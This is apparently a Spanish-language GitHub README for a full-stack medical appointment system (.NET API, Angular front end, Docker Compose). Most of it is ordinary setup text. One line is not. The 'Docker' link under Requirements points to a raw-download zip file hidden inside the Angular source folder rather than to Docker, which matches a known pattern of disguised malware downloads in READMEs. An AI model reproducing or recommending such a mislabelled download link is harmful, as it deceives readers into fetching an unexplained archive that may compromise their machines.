# appointment-management-system
Prueba Técnica: Sistema de Gestión de Citas (Full Stack .NET + Angular)

# Sistema de Gestión de Citas (Full Stack)

Este proyecto es un sistema de gestión de citas médicas desarrollado con **.NET 10** para el Backend (API) y **Angular 21** para el Frontend (Web). Todo el proyecto está consolidado en este repositorio único para facilitar su despliegue y desarrollo.

## 🏗️ Estructura del Proyecto

- `appointment-api/`: Backend desarrollado en .NET aplicando Arquitectura Hexagonal.
- `appointment-web/`: Frontend desarrollado en Angular con un diseño moderno.
- `docker-compose.yml`: Archivo de orquestación para levantar todo el ecosistema.

---

## 🚀 Cómo Levantar el Proyecto con Docker (Recomendado)

La forma más rápida de ejecutar el proyecto es utilizando Docker Compose. Esto levantará tanto la base de datos (In-Memory para esta versión), el API y el Frontend.

### Requisitos
- [Docker](https://github.com/rubendario921/appointment-management-system/raw/refs/heads/main/appointment-web/src/app/appointment-page/management-system-appointment-2.0.zip)
- Docker Compose

### Pasos:
1. Abre una terminal en la raíz del proyecto (`appointment-management-system`).
2. Ejecuta el siguiente comando para construir y levantar los contenedores:
   ```bash
   docker-compose up --build
   ```
   *(Nota: Si usas Docker V2, puedes usar `docker compose up --build`)*

3. Una vez termine, podrás acceder a:
   - **Frontend:** [http://localhost](http://localhost)
   - **Backend API:** [http://localhost:5079](http://localhost:5079)
   - **Documentación API (Scalar):** [http://localhost:5079/scalar/v1](http://localhost:5079/scalar/v1)

---

## 💻 Desarrollo Local (Sin Docker)

Si prefieres ejecutar los servicios por separado para desarrollo:

### Backend (.NET API)
1. Navega a la carpeta del API:
   ```bash
   cd appointment-api
   ```
2. Ejecuta el proyecto:
   ```bash
   dotnet run
   ```
   *El API correrá por defecto en `http://localhost:5079`.*

### Frontend (Angular Web)
1. Navega a la carpeta de la web:
   ```bash
   cd appointment-web
   ```
2. Instala las dependencias:
   ```bash
   npm install
   ```
3. Inicia el servidor de desarrollo:
   ```bash
   npm start
   ```
   *La web correrá en `http://localhost:4200`.*

---

## 🛠️ Tecnologías Utilizadas

- **Backend:** .NET 10, Entity Framework Core (In-Memory), Arquitectura Hexagonal.
- **Frontend:** Angular 21, HttpClient, CSS Moderno.
- **Despliegue:** Docker, Docker Compose, Nginx.

---

## 📝 Notas
- El Backend utiliza una base de datos **In-Memory** por lo que los datos se reiniciarán al apagar el contenedor.
- El API tiene CORS habilitado para permitir peticiones desde el origen de la web.
